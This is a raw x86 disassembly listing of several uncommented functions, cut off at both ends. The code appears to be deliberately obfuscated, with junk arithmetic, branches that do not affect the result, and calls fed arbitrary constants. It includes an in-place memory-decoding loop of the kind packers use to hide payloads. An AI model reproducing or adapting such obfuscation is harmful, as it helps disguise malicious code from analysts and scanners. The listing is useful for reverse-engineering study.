  41b797:	add    DWORD PTR [ebp-0x20],edi
  41b79a:	mov    edi,DWORD PTR [ebp-0x20]
  41b79d:	cmp    edi,DWORD PTR [ebp-0x10]
  41b7a0:	je     0x41b7e4
  41b7a2:	add    esi,edx
  41b7a4:	xor    edx,edx
  41b7a6:	or     edx,ecx
  41b7a8:	add    DWORD PTR [ebp-0x20],esi
  41b7ab:	cmp    ebx,edi
  41b7ad:	je     0x41b7e4
  41b7af:	cmp    edx,DWORD PTR [ebp-0x20]
  41b7b2:	jne    0x41b7e4
  41b7b4:	sub    DWORD PTR [ebp-0x20],ebx
  41b7b7:	cmp    edi,ebx
  41b7b9:	jne    0x41b7e4
  41b7bb:	test   edx,0x81e7
  41b7c1:	jne    0x41b7e4
  41b7c3:	sub    DWORD PTR [ebp-0x20],ebx
  41b7c6:	xor    ebx,ebx
  41b7c8:	xor    DWORD PTR [ebp-0x20],edx
  41b7cb:	add    DWORD PTR [ebp-0x20],ebx
  41b7ce:	sub    edi,ebx
  41b7d0:	mov    edx,DWORD PTR ds:0x424084
  41b7d6:	sub    edi,edx
  41b7d8:	and    edi,ecx
  41b7da:	and    edi,eax
  41b7dc:	cmp    edi,DWORD PTR [ebp-0x14]
  41b7df:	je     0x41b7e4
  41b7e1:	sub    DWORD PTR [ebp-0x20],edi
  41b7e4:	add    DWORD PTR [ebp-0x20],eax
  41b7e7:	add    DWORD PTR [ebp-0x20],ebx
  41b7ea:	pop    edi
  41b7eb:	or     ebx,edx
  41b7ed:	or     ebx,ecx
  41b7ef:	mov    esi,eax
  41b7f1:	sub    esi,edx
  41b7f3:	cmp    ebx,DWORD PTR ds:0x424084
  41b7f9:	je     0x41b8b3
  41b7ff:	sub    DWORD PTR [ebp-0x20],ebx
  41b802:	add    esi,ecx
  41b804:	mov    ebx,0xad
  41b809:	sub    ebx,esi
  41b80b:	cmp    ebx,0xf570
  41b811:	je     0x41b8b3
  41b817:	cmp    edi,DWORD PTR ds:0x424084
  41b81d:	je     0x41b8b3
  41b823:	cmp    edi,0x3641
  41b829:	je     0x41b8b3
  41b82f:	xor    ecx,ecx
  41b831:	xor    esi,esi
  41b833:	and    ecx,eax
  41b835:	sub    DWORD PTR [ebp-0x20],edi
  41b838:	add    ebx,ebx
  41b83a:	add    esi,ebx
  41b83c:	test   edi,0xa
  41b842:	jne    0x41b8b3
  41b844:	mov    ecx,DWORD PTR ds:0x424084
  41b84a:	mov    ebx,0xef
  41b84f:	sub    DWORD PTR [ebp-0x20],edx
  41b852:	sub    esi,eax
  41b854:	and    esi,ecx
  41b856:	cmp    esi,DWORD PTR ds:0x424084
  41b85c:	je     0x41b8b3
  41b85e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b861:	mov    edx,DWORD PTR [ebp-0x20]
  41b864:	cmp    edx,0x51
  41b867:	jne    0x41b8b3
  41b869:	mov    ebx,esi
  41b86b:	add    DWORD PTR [ebp-0x20],ecx
  41b86e:	add    DWORD PTR [ebp-0x20],edx
  41b871:	mov    DWORD PTR [ebp-0x18],eax
  41b874:	test   ebx,0x45
  41b87a:	jne    0x41b8b3
  41b87c:	mov    esi,DWORD PTR [ebp-0x20]
  41b87f:	cmp    ecx,0xffffffb1
  41b882:	je     0x41b8b3
  41b884:	mov    edx,DWORD PTR [ebp-0x20]
  41b887:	mov    ecx,DWORD PTR [ebp-0x18]
  41b88a:	or     DWORD PTR [ebp-0x18],edx
  41b88d:	test   ebx,0xd587
  41b893:	jne    0x41b8b3
  41b895:	xor    edx,edx
  41b897:	or     DWORD PTR [ebp-0x20],edx
  41b89a:	add    ebx,ebx
  41b89c:	sub    esi,eax
  41b89e:	cmp    ecx,0x19ef
  41b8a4:	je     0x41b8b3
  41b8a6:	mov    edx,edi
  41b8a8:	sub    DWORD PTR [ebp-0x20],esi
  41b8ab:	or     ebx,edx
  41b8ad:	mov    DWORD PTR [ebp-0x20],ebx
  41b8b0:	add    DWORD PTR [ebp-0x18],ecx
  41b8b3:	pop    esi
  41b8b4:	add    DWORD PTR [ebp-0x20],ebx
  41b8b7:	pop    ebx
  41b8b8:	mov    edx,DWORD PTR ds:0x424084
  41b8be:	and    edx,esi
  41b8c0:	mov    ecx,ebx
  41b8c2:	or     edx,eax
  41b8c4:	sub    edx,eax
  41b8c6:	add    DWORD PTR [ebp-0x20],edx
  41b8c9:	add    DWORD PTR [ebp-0x20],ecx
  41b8cc:	leave  
  41b8cd:	ret    
  41b8ce:	int3   
  41b8cf:	int3   
  41b8d0:	int3   
  41b8d1:	int3   
  41b8d2:	int3   
  41b8d3:	push   ebp
  41b8d4:	mov    ebp,esp
  41b8d6:	sub    esp,0x18
  41b8d9:	push   0x27059900
  41b8de:	push   0x10
  41b8e0:	push   0xffffffb1
  41b8e2:	push   0x19
  41b8e4:	call   0x41c4c4
  41b8e9:	add    esp,0x10
  41b8ec:	push   ebx
  41b8ed:	push   0x5d
  41b8ef:	push   0x770c6600
  41b8f4:	push   eax
  41b8f5:	call   0x41c330
  41b8fa:	add    esp,0xc
  41b8fd:	push   esi
  41b8fe:	push   0xffffffe5
  41b900:	call   0x41c330
  41b905:	add    esp,0x4
  41b908:	push   edi
  41b909:	mov    DWORD PTR [ebp-0x8],eax
  41b90c:	push   0x59
  41b90e:	call   0x41c20f
  41b913:	add    esp,0x4
  41b916:	cmp    eax,DWORD PTR [ebp-0x18]
  41b919:	jne    0x41b927
  41b91b:	push   0x4d
  41b91d:	push   0x12
  41b91f:	call   0x41c72f
  41b924:	add    esp,0x8
  41b927:	mov    ecx,DWORD PTR [ebp+0x10]
  41b92a:	sub    eax,ecx
  41b92c:	cmp    eax,DWORD PTR [ebp-0xc]
  41b92f:	jne    0x41b934
  41b931:	or     DWORD PTR [ebp-0x8],eax
  41b934:	mov    eax,DWORD PTR [ebp+0x8]
  41b937:	mov    esi,0x46
  41b93c:	mov    edx,0xc4
  41b941:	mov    DWORD PTR [ebp-0x8],ecx
  41b944:	or     edx,esi
  41b946:	sub    DWORD PTR [ebp-0x8],edx
  41b949:	cmp    DWORD PTR [ebp+0xc],ecx
  41b94c:	je     0x41ba56
  41b952:	add    DWORD PTR [ebp-0x8],eax
  41b955:	dec    DWORD PTR [ebp+0xc]
  41b958:	add    esi,edx
  41b95a:	mov    edi,DWORD PTR [ebp-0x8]
  41b95d:	mov    ebx,0x31
  41b962:	or     DWORD PTR [ebp-0x8],esi
  41b965:	sub    DWORD PTR [ebp-0x8],edi
  41b968:	add    ebx,edi
  41b96a:	and    ebx,ecx
  41b96c:	add    ebx,esi
  41b96e:	test   ebx,0xcf9d
  41b974:	jne    0x41b979
  41b976:	sub    DWORD PTR [ebp-0x8],ebx
  41b979:	sub    DWORD PTR [eax],ecx
  41b97b:	mov    edx,DWORD PTR [ebp-0x8]
  41b97e:	mov    ebx,DWORD PTR [ebp-0x8]
  41b981:	sub    DWORD PTR [ebp-0x8],edx
  41b984:	sub    ebx,edi
  41b986:	sub    ebx,ecx
  41b988:	mov    DWORD PTR [ebp-0x8],ebx
  41b98b:	sub    DWORD PTR [eax],0x10c8c57f
  41b991:	mov    edi,0x3c
  41b996:	mov    edx,DWORD PTR [ebp-0x8]
  41b999:	xor    DWORD PTR [ebp-0x8],edi
  41b99c:	cmp    edx,0xffffff8e
  41b99f:	je     0x41b9f0
  41b9a1:	mov    esi,DWORD PTR ds:0x424064
  41b9a7:	sub    DWORD PTR [ebp-0x8],edx
  41b9aa:	sub    esi,eax
  41b9ac:	add    esi,edx
  41b9ae:	mov    edx,DWORD PTR [ebp-0x8]
  41b9b1:	add    DWORD PTR [ebp-0x8],ecx
  41b9b4:	cmp    edx,DWORD PTR [ebp-0x18]
  41b9b7:	je     0x41b9f0
  41b9b9:	add    DWORD PTR [ebp-0x8],edi
  41b9bc:	sub    DWORD PTR [ebp-0x8],edx
  41b9bf:	cmp    edx,DWORD PTR ds:0x424064
  41b9c5:	je     0x41b9f0
  41b9c7:	and    esi,ecx
  41b9c9:	mov    ebx,edi
  41b9cb:	add    ebx,edx
  41b9cd:	cmp    esi,0x7e
  41b9d0:	jne    0x41b9f0
  41b9d2:	xor    edx,edx
  41b9d4:	mov    edx,DWORD PTR [ebp-0x8]
  41b9d7:	sub    esi,eax
  41b9d9:	cmp    ebx,DWORD PTR [ebp-0x18]
  41b9dc:	je     0x41b9f0
  41b9de:	test   esi,0xf3de
  41b9e4:	jne    0x41b9f0
  41b9e6:	add    DWORD PTR [ebp-0x8],esi
  41b9e9:	add    ebx,ecx
  41b9eb:	add    ebx,edx
  41b9ed:	sub    DWORD PTR [ebp-0x8],ebx
  41b9f0:	neg    DWORD PTR [eax]
  41b9f2:	cmp    esi,DWORD PTR ds:0x424064
  41b9f8:	je     0x41b9ff
  41b9fa:	mov    edx,edi
  41b9fc:	add    DWORD PTR [ebp-0x8],edx
  41b9ff:	sub    DWORD PTR [eax],0x50a3e676
  41ba05:	cmp    esi,0xffffffc7
  41ba08:	je     0x41ba0d
  41ba0a:	sub    DWORD PTR [ebp-0x8],ecx
  41ba0d:	add    eax,0x4
  41ba10:	mov    edi,DWORD PTR [ebp-0x8]
  41ba13:	test   eax,0x7f
  41ba18:	je     0x41ba51
  41ba1a:	mov    esi,0x91
  41ba1f:	or     edi,ecx
  41ba21:	cmp    eax,DWORD PTR [ebp-0x14]
  41ba24:	jne    0x41ba51
  41ba26:	add    edi,ebx
  41ba28:	sub    edi,esi
  41ba2a:	cmp    eax,0x9efd
  41ba2f:	je     0x41ba51
  41ba31:	mov    esi,0xb4
  41ba36:	xor    edx,edx
  41ba38:	and    edx,ebx
  41ba3a:	sub    edi,eax
  41ba3c:	add    DWORD PTR [ebp-0x8],eax
  41ba3f:	sub    DWORD PTR [ebp-0x8],edi
  41ba42:	add    esi,edx
  41ba44:	or     esi,edx
  41ba46:	test   esi,0xdd
  41ba4c:	jne    0x41ba51
  41ba4e:	sub    DWORD PTR [ebp-0x8],esi
  41ba51:	jmp    0x41b937
  41ba56:	push   0x95863800
  41ba5b:	call   0x41c4c4
  41ba60:	add    esp,0x4
  41ba63:	push   ecx
  41ba64:	push   edx
  41ba65:	push   0xffffff8b
  41ba67:	push   0xd507500
  41ba6c:	call   0x41c4c4
  41ba71:	add    esp,0x10
  41ba74:	push   0x15a23700
  41ba79:	push   0x34
  41ba7b:	push   0x157b6100
  41ba80:	push   0xfffffffc
  41ba82:	push   0x3dccf200
  41ba87:	call   0x41c4c4
  41ba8c:	add    esp,0x14
  41ba8f:	push   0xf7291800
  41ba94:	call   0x41c4c4
  41ba99:	add    esp,0x4
  41ba9c:	push   eax
  41ba9d:	push   eax
  41ba9e:	call   0x41c72f
  41baa3:	add    esp,0x8
  41baa6:	push   eax
  41baa7:	push   eax
  41baa8:	push   eax
  41baa9:	push   0xffffffcf
  41baab:	push   0x7
  41baad:	call   0x41c4c4
  41bab2:	add    esp,0x14
  41bab5:	pop    edi
  41bab6:	push   0xd772b600
  41babb:	push   edi
  41babc:	call   0x41c20f
  41bac1:	add    esp,0x8
  41bac4:	pop    esi
  41bac5:	push   0xffffffaa
  41bac7:	push   edi
  41bac8:	call   0x41c20f
  41bacd:	add    esp,0x8
  41bad0:	pop    ebx
  41bad1:	mov    eax,DWORD PTR [ebp-0x8]
  41bad4:	cmp    ebx,DWORD PTR ds:0x424064
  41bada:	je     0x41bafe
  41badc:	sub    eax,ebx
  41bade:	mov    ecx,0xeb
  41bae3:	push   0xa7184900
  41bae8:	push   0xffffff8b
  41baea:	push   0xd257800
  41baef:	push   0xdd9d1d00
  41baf4:	push   0xffffffe0
  41baf6:	call   0x41c330
  41bafb:	add    esp,0x14
  41bafe:	leave  
  41baff:	ret    0xc
  41bb02:	int3   
  41bb03:	int3   
  41bb04:	int3   
  41bb05:	int3   
  41bb06:	int3   
  41bb07:	push   ebp
  41bb08:	mov    ebp,esp
  41bb0a:	sub    esp,0x4c
  41bb0d:	push   0x39
  41bb0f:	push   0x10
  41bb11:	call   0x41c72f
  41bb16:	add    esp,0x8
  41bb19:	push   0xc7296800
  41bb1e:	push   0xc77d1f00
  41bb23:	push   0xffffffcb
  41bb25:	call   0x41c4c4
  41bb2a:	add    esp,0xc
  41bb2d:	push   ebx
  41bb2e:	push   0xb57d7900
  41bb33:	call   0x41c13c
  41bb38:	add    esp,0x4
  41bb3b:	push   esi
  41bb3c:	mov    eax,0xa7
  41bb41:	push   0x9dd6f400
  41bb46:	push   eax
  41bb47:	push   eax
  41bb48:	push   0x67003a00
  41bb4d:	push   0x73
  41bb4f:	call   0x41c13c
  41bb54:	add    esp,0x14
  41bb57:	push   eax
  41bb58:	call   0x41c4c4
  41bb5d:	add    esp,0x4
  41bb60:	push   edi
  41bb61:	cmp    eax,0x49
  41bb64:	je     0x41bb74
  41bb66:	push   eax
  41bb67:	push   0xffffffd9
  41bb69:	push   0xfffffff4
  41bb6b:	push   eax
  41bb6c:	call   0x41c5c5
  41bb71:	add    esp,0x10
  41bb74:	push   0xffffff9b
  41bb76:	push   0xf9a51200
  41bb7b:	push   0xffffffda
  41bb7d:	push   0xffffffe0
  41bb7f:	push   eax
  41bb80:	call   0x41c330
  41bb85:	add    esp,0x14
  41bb88:	push   eax
  41bb89:	push   0xa19ddb00
  41bb8e:	push   0x2d
  41bb90:	push   eax
  41bb91:	call   0x41c13c
  41bb96:	add    esp,0x10
  41bb99:	push   0xffffffab
  41bb9b:	push   eax
  41bb9c:	push   0x41e91e00
  41bba1:	push   eax
  41bba2:	call   0x41c13c
  41bba7:	add    esp,0x10
  41bbaa:	mov    ebx,0x6a25a9db
  41bbaf:	mov    eax,ebx
  41bbb1:	call   0x41c20f
  41bbb6:	sub    ebx,0x6a25a99b
  41bbbc:	push   eax
  41bbbd:	push   0xffffffe6
  41bbbf:	push   0x17760900
  41bbc4:	push   0x65
  41bbc6:	push   ebx
  41bbc7:	call   0x41c330
  41bbcc:	add    esp,0x14
  41bbcf:	push   0xb5010f00
  41bbd4:	push   0x11
  41bbd6:	push   0xffffffd7
  41bbd8:	push   0xadc85800
  41bbdd:	call   0x41c72f
  41bbe2:	add    esp,0x10
  41bbe5:	push   ebx
  41bbe6:	mov    eax,ebx
  41bbe8:	xor    esi,esi
  41bbea:	push   0x776af500
  41bbef:	call   0x41c5c5
  41bbf4:	add    esp,0x4
  41bbf7:	or     esi,ebx
  41bbf9:	call   0x41c4c4
  41bbfe:	push   0x23
  41bc00:	call   0x41c5c5
  41bc05:	add    esp,0x4
  41bc08:	push   0xcd677d00
  41bc0d:	push   0x91887e00
  41bc12:	push   eax
  41bc13:	push   0xb9d02a00
  41bc18:	call   0x41c4c4
  41bc1d:	add    esp,0x10
  41bc20:	push   0xd1b45500
  41bc25:	push   0x353b2400
  41bc2a:	push   eax
  41bc2b:	push   0x65d32900
  41bc30:	call   0x41c20f
  41bc35:	add    esp,0x10
  41bc38:	push   esi
  41bc39:	push   esi
  41bc3a:	call   0x41c72f
  41bc3f:	add    esp,0x8
  41bc42:	push   eax
  41bc43:	push   0x7746900
  41bc48:	push   0x8580e900
  41bc4d:	push   0x4d763500
  41bc52:	push   ebx
  41bc53:	call   0x41c330
  41bc58:	add    esp,0x14
  41bc5b:	mov    esi,0xc610b3a7
  41bc60:	push   0x25
  41bc62:	push   eax
  41bc63:	push   ebx
  41bc64:	push   0x48
  41bc66:	push   esi
  41bc67:	call   0x41c20f
  41bc6c:	add    esp,0x14
  41bc6f:	push   0x51a74700
  41bc74:	push   ebx
  41bc75:	push   0xffffffca
  41bc77:	push   0xffffffba
  41bc79:	push   eax
  41bc7a:	call   0x41c13c
  41bc7f:	add    esp,0x14
  41bc82:	add    esi,0x39ef7c59
  41bc88:	push   0x89bcc100
  41bc8d:	push   0x2a
  41bc8f:	push   eax
  41bc90:	call   0x41c330
  41bc95:	add    esp,0xc
  41bc98:	push   0x4715f900
  41bc9d:	push   0x95906600
  41bca2:	push   eax
  41bca3:	push   0x46
  41bca5:	call   0x41c20f
  41bcaa:	add    esp,0x10
  41bcad:	push   esi
  41bcae:	push   0xffffffee
  41bcb0:	call   0x41c20f
  41bcb5:	add    esp,0x4
  41bcb8:	push   0x4d7e0900
  41bcbd:	push   ebx
  41bcbe:	push   0x31
  41bcc0:	call   0x41c4c4
  41bcc5:	add    esp,0xc
  41bcc8:	push   0x64edd
  41bccd:	mov    edi,0xf4
  41bcd2:	call   0x41c20f
  41bcd7:	mov    DWORD PTR [ebp-0x44],esi
  41bcda:	call   0x41c20f
  41bcdf:	push   eax
  41bce0:	call   0x41c4c4
  41bce5:	add    esp,0x4
  41bce8:	call   0x41c13c
  41bced:	push   0x972ee800
  41bcf2:	push   esi
  41bcf3:	push   0xffffffff
  41bcf5:	push   0xb53faa00
  41bcfa:	call   0x41c20f
  41bcff:	add    esp,0x10
  41bd02:	push   esi
  41bd03:	call   0x41c5c5
  41bd08:	add    esp,0x4
  41bd0b:	push   0xffffffc9
  41bd0d:	push   0xe77cfa00
  41bd12:	push   0xffffff97
  41bd14:	push   ebx
  41bd15:	call   0x41c4c4
  41bd1a:	add    esp,0x10
  41bd1d:	add    DWORD PTR [ebp-0x44],esi
  41bd20:	push   0xfffffffc
  41bd22:	push   edi
  41bd23:	push   0xb9e91500
  41bd28:	push   eax
  41bd29:	call   0x41c20f
  41bd2e:	add    esp,0x10
  41bd31:	call   0x41c13c
  41bd36:	push   0x0
  41bd38:	mov    DWORD PTR [ebp-0x20],eax
  41bd3b:	call   0x41c13c
  41bd40:	mov    edx,0x40dbad7f
  41bd45:	mov    ebx,0xc7
  41bd4a:	mov    eax,0xb998
  41bd4f:	and    eax,ebx
  41bd51:	add    eax,edx
  41bd53:	and    eax,edx
  41bd55:	and    DWORD PTR [ebp-0x44],eax
  41bd58:	sub    edx,0x40999393
  41bd5e:	mov    edi,DWORD PTR [ebp-0x44]
  41bd61:	mov    eax,0x85000400
  41bd66:	or     DWORD PTR [ebp-0x20],edx
  41bd69:	or     edi,eax
  41bd6b:	add    edi,edi
  41bd6d:	add    DWORD PTR [ebp-0x44],edi
  41bd70:	call   DWORD PTR [edx]
  41bd72:	cmp    edi,DWORD PTR [ebp-0x38]
  41bd75:	je     0x41bdb3
  41bd77:	cmp    eax,0x8
  41bd7a:	jne    0x41bdb3
  41bd7c:	cmp    eax,0xa8ba
  41bd81:	je     0x41bdb3
  41bd83:	add    edi,ebx
  41bd85:	mov    ecx,DWORD PTR [ebp-0x20]
  41bd88:	mov    esi,DWORD PTR [ebp-0x44]
  41bd8b:	sub    edi,eax
  41bd8d:	cmp    ecx,0xe2f6
  41bd93:	je     0x41bdb3
  41bd95:	mov    DWORD PTR [ebp-0x44],ecx
  41bd98:	xor    ebx,ebx
  41bd9a:	sub    edi,esi
  41bd9c:	mov    ecx,DWORD PTR [ebp-0x20]
  41bd9f:	and    ecx,edi
  41bda1:	sub    DWORD PTR [ebp-0x44],ebx
  41bda4:	sub    ecx,ebx
  41bda6:	cmp    ecx,0xd003192
  41bdac:	jne    0x41bdb3
  41bdae:	sub    ecx,eax
  41bdb0:	add    DWORD PTR [ebp-0x20],ecx
  41bdb3:	mov    DWORD PTR [ebp-0x30],eax
  41bdb6:	push   0xffffffb7
  41bdb8:	push   0xffffff92
  41bdba:	push   0xffffffbe
  41bdbc:	push   0xffffff93
  41bdbe:	call   0x41c4c4
  41bdc3:	add    esp,0x10
  41bdc6:	push   0xffffffb6
  41bdc8:	push   0x7e
  41bdca:	push   0x659e8100
  41bdcf:	call   0x41c330
  41bdd4:	add    esp,0xc
  41bdd7:	mov    eax,0x120d92d1
  41bddc:	and    ebx,esi
  41bdde:	mov    ecx,DWORD PTR [ebp-0x44]
  41bde1:	test   ecx,0xba
  41bde7:	je     0x41be15
  41bde9:	sub    DWORD PTR [ebp-0x20],eax
  41bdec:	sub    DWORD PTR [ebp-0x20],ecx
  41bdef:	add    ebx,eax
  41bdf1:	test   ebx,0xd01e8b8
  41bdf7:	je     0x41be15
  41bdf9:	mov    esi,DWORD PTR [ebp-0x20]
  41bdfc:	cmp    esi,0xbf38
  41be02:	jne    0x41be15
  41be04:	test   esi,0xb3
  41be0a:	je     0x41be15
  41be0c:	sub    DWORD PTR [ebp-0x20],ecx
  41be0f:	mov    DWORD PTR [ebp-0x20],ebx
  41be12:	sub    DWORD PTR [ebp-0x20],esi
  41be15:	add    eax,0xee33c4ff
  41be1a:	mov    esi,0x24
  41be1f:	mov    ebx,0x41
  41be24:	add    DWORD PTR [ebp-0x20],eax
  41be27:	add    DWORD PTR [ebp-0x44],esi
  41be2a:	add    ebx,ebx
  41be2c:	or     ebx,esi
  41be2e:	add    ebx,edi
  41be30:	cmp    ebx,0x6
  41be33:	je     0x41be57
  41be35:	sub    ebx,esi
  41be37:	mov    edx,0x36
  41be3c:	mov    ecx,DWORD PTR [ebp-0x44]
  41be3f:	sub    edx,ecx
  41be41:	sub    ebx,esi
  41be43:	add    ebx,edx
  41be45:	or     ebx,edi
  41be47:	test   ebx,0x6a
  41be4d:	je     0x41be57
  41be4f:	mov    edx,eax
  41be51:	add    DWORD PTR [ebp-0x44],edx
  41be54:	sub    DWORD PTR [ebp-0x20],ebx
  41be57:	mov    DWORD PTR [ebp-0x14],eax
  41be5a:	push   0xffffff9c
  41be5c:	push   edi
  41be5d:	push   0x15aee600
  41be62:	push   edi
  41be63:	call   0x41c330
  41be68:	add    esp,0x10
  41be6b:	push   ebx
  41be6c:	push   0xd257c00
  41be71:	call   0x41c5c5
  41be76:	add    esp,0x8
  41be79:	mov    edi,DWORD PTR [ebp-0x30]
  41be7c:	push   ebx
  41be7d:	push   esi
  41be7e:	push   0x2
  41be80:	push   0x9712dc00
  41be85:	push   0xfffffff1
  41be87:	call   0x41c330
  41be8c:	add    esp,0x14
  41be8f:	push   ebx
  41be90:	push   0xffffffa7
  41be92:	push   0x6a
  41be94:	call   0x41c4c4
  41be99:	add    esp,0xc
  41be9c:	push   edi
  41be9d:	call   0x41c13c
  41bea2:	add    esp,0x4
  41bea5:	push   0x0
  41bea7:	call   0x41c4c4
  41beac:	add    esp,0x4
  41beaf:	mov    ebx,DWORD PTR [ebp-0x14]
  41beb2:	xor    edx,edx
  41beb4:	push   0xb741c600
  41beb9:	push   eax
  41beba:	call   0x41c13c
  41bebf:	add    esp,0x8
  41bec2:	push   ebx
  41bec3:	call   0x41c330
  41bec8:	add    esp,0x4
  41becb:	mov    esi,DWORD PTR [ebx]
  41becd:	cmp    edi,eax
  41becf:	jne    0x41bee2
  41bed1:	add    eax,ebx
  41bed3:	mov    ecx,DWORD PTR [ebp-0x44]
  41bed6:	mov    edx,ebx
  41bed8:	push   0xd
  41beda:	call   0x41c20f
  41bedf:	add    esp,0x4
  41bee2:	mov    ecx,DWORD PTR [ebx+0x4]
  41bee5:	add    eax,edi
  41bee7:	mov    edx,edi
  41bee9:	add    eax,esi
  41beeb:	cmp    ecx,DWORD PTR [ebp-0x3c]
  41beee:	je     0x41befd
  41bef0:	sub    DWORD PTR [ebp-0x20],ecx
  41bef3:	add    eax,edx
  41bef5:	cmp    eax,0xffffffeb
  41bef8:	jne    0x41befd
  41befa:	add    DWORD PTR [ebp-0x44],eax
  41befd:	or     esi,esi
  41beff:	je     0x41bf74
  41bf01:	cmp    ecx,edx
  41bf03:	jne    0x41bf4a
  41bf05:	xor    edx,edx
  41bf07:	mov    edx,DWORD PTR [ebp-0x20]
  41bf0a:	cmp    edi,0x25ba
  41bf10:	je     0x41bf4a
  41bf12:	sub    edx,edi
  41bf14:	xor    eax,eax
  41bf16:	sub    DWORD PTR [ebp-0x44],edi
  41bf19:	cmp    edx,0x2b
  41bf1c:	jne    0x41bf4a
  41bf1e:	sub    edx,ebx
  41bf20:	sub    DWORD PTR [ebp-0x20],eax
  41bf23:	mov    eax,0xe4e3
  41bf28:	sub    edx,edi
  41bf2a:	cmp    edx,0xc7b1
  41bf30:	je     0x41bf4a
  41bf32:	sub    DWORD PTR [ebp-0x20],edx
  41bf35:	mov    edx,0x61
  41bf3a:	add    edx,edx
  41bf3c:	add    edx,ecx
  41bf3e:	xor    eax,eax
  41bf40:	sub    edx,ecx
  41bf42:	add    DWORD PTR [ebp-0x44],edx
  41bf45:	sub    eax,esi
  41bf47:	add    DWORD PTR [ebp-0x20],eax
  41bf4a:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf4c:	push   0x8704f000
  41bf51:	call   0x41c20f
  41bf56:	add    esp,0x4
  41bf59:	add    DWORD PTR [ebp-0x14],0x8
  41bf5d:	push   0x9d9a6e00
  41bf62:	call   0x41c4c4
  41bf67:	add    esp,0x4
  41bf6a:	call   0x41c72f
  41bf6f:	jmp    0x41be7c
  41bf74:	cmp    esi,0x91b01a44
  41bf7a:	je     0x41bf7f
  41bf7c:	add    DWORD PTR [ebp-0x44],esi
  41bf7f:	push   0x154ef900
  41bf84:	call   0x41c330
  41bf89:	add    esp,0x4
  41bf8c:	add    eax,eax
  41bf8e:	push   0xffffffb9
  41bf90:	push   eax
  41bf91:	push   eax
  41bf92:	push   0x7d853300
  41bf97:	push   0x47275b00
  41bf9c:	call   0x41c13c
  41bfa1:	add    esp,0x14
  41bfa4:	mov    eax,DWORD PTR [ebp-0x30]
  41bfa7:	cmp    eax,0x4f
  41bfaa:	jne    0x41bfbc
  41bfac:	test   eax,0x5012900
  41bfb1:	je     0x41bfbc
  41bfb3:	mov    ecx,DWORD PTR [ebp-0x44]
  41bfb6:	sub    DWORD PTR [ebp-0x20],eax
  41bfb9:	mov    DWORD PTR [ebp-0x28],ecx
  41bfbc:	mov    edi,DWORD PTR [ebp-0x44]
  41bfbf:	cmp    edi,DWORD PTR [ebp-0xc]
  41bfc2:	je     0x41bfeb
  41bfc4:	test   edi,0x9d
  41bfca:	jne    0x41bfeb
  41bfcc:	cmp    ecx,DWORD PTR [ebp-0x28]
  41bfcf:	jne    0x41bfeb
  41bfd1:	add    edi,ecx
  41bfd3:	mov    edx,DWORD PTR [ebp-0x20]
  41bfd6:	mov    ecx,DWORD PTR [ebp-0x20]
  41bfd9:	sub    DWORD PTR [ebp-0x20],edx
  41bfdc:	add    ecx,ecx
  41bfde:	add    edi,ecx
  41bfe0:	test   ecx,0x17df
  41bfe6:	jne    0x41bfeb
  41bfe8:	mov    DWORD PTR [ebp-0x20],edi
  41bfeb:	pop    edi
  41bfec:	mov    esi,DWORD PTR [ebp-0x20]
  41bfef:	sub    esi,edi
  41bff1:	and    esi,edx
  41bff3:	mov    ebx,0xa7
  41bff8:	cmp    esi,0xb
  41bffb:	je     0x41c0ed
  41c001:	add    DWORD PTR [ebp-0x44],ebx
  41c004:	mov    ecx,DWORD PTR [ebp-0x44]
  41c007:	and    ecx,ebx
  41c009:	xor    ebx,ebx
  41c00b:	add    DWORD PTR [ebp-0x44],esi
  41c00e:	sub    ecx,edx
  41c010:	cmp    ecx,DWORD PTR [ebp-0x1c]
  41c013:	jne    0x41c0ed
  41c019:	mov    edx,DWORD PTR [ebp-0x44]
  41c01c:	cmp    ecx,0x6b
  41c01f:	jne    0x41c0ed
  41c025:	or     ecx,edi
  41c027:	mov    esi,DWORD PTR [ebp-0x44]
  41c02a:	add    DWORD PTR [ebp-0x20],edx
  41c02d:	cmp    edx,DWORD PTR [ebp-0xc]
  41c030:	jne    0x41c0ed
  41c036:	test   esi,0x9e
  41c03c:	jne    0x41c0ed
  41c042:	cmp    esi,0x55
  41c045:	je     0x41c0ed
  41c04b:	mov    edx,DWORD PTR [ebp-0x44]
  41c04e:	cmp    esi,ecx
  41c050:	jne    0x41c0ed
  41c056:	or     edx,eax
  41c058:	cmp    esi,0xffffffad
  41c05b:	jne    0x41c0ed
  41c061:	sub    DWORD PTR [ebp-0x20],edx
  41c064:	sub    DWORD PTR [ebp-0x44],esi
  41c067:	mov    edx,DWORD PTR [ebp-0x44]
  41c06a:	xor    esi,esi
  41c06c:	add    esi,edx
  41c06e:	sub    ebx,edi
  41c070:	cmp    esi,ebx
  41c072:	je     0x41c0ed
  41c074:	mov    edx,ecx
  41c076:	mov    ecx,DWORD PTR [ebp-0x44]
  41c079:	add    ebx,esi
  41c07b:	cmp    esi,0xffffff8b
  41c07e:	je     0x41c0ed
  41c080:	mov    esi,DWORD PTR [ebp-0x20]
  41c083:	sub    DWORD PTR [ebp-0x20],edx
  41c086:	or     ebx,edi
  41c088:	add    esi,esi
  41c08a:	mov    edx,eax
  41c08c:	sub    edx,eax
  41c08e:	add    DWORD PTR [ebp-0x44],ecx
  41c091:	add    DWORD PTR [ebp-0x20],edx
  41c094:	sub    esi,eax
  41c096:	sub    esi,ecx
  41c098:	sub    DWORD PTR [ebp-0x44],ebx
  41c09b:	cmp    esi,DWORD PTR [ebp-0x28]
  41c09e:	je     0x41c0ed
  41c0a0:	cmp    esi,edi
  41c0a2:	je     0x41c0ed
  41c0a4:	mov    ebx,edx
  41c0a6:	mov    edx,0xc0
  41c0ab:	cmp    eax,0x15040018
  41c0b0:	jne    0x41c0ed
  41c0b2:	cmp    esi,0xffffffe9
  41c0b5:	jne    0x41c0ed
  41c0b7:	mov    DWORD PTR [ebp-0x44],esi
  41c0ba:	mov    DWORD PTR [ebp-0x44],ebx
  41c0bd:	sub    edx,ecx
  41c0bf:	add    edx,eax
  41c0c1:	xor    esi,esi
  41c0c3:	sub    edx,ebx
  41c0c5:	sub    esi,ebx
  41c0c7:	mov    ebx,DWORD PTR [ebp-0x20]
  41c0ca:	sub    ebx,eax
  41c0cc:	add    DWORD PTR [ebp-0x20],esi
  41c0cf:	and    ebx,ecx
  41c0d1:	sub    edx,ecx
  41c0d3:	sub    ebx,edi
  41c0d5:	cmp    eax,ebx
  41c0d7:	jne    0x41c0ed
  41c0d9:	sub    ebx,ecx
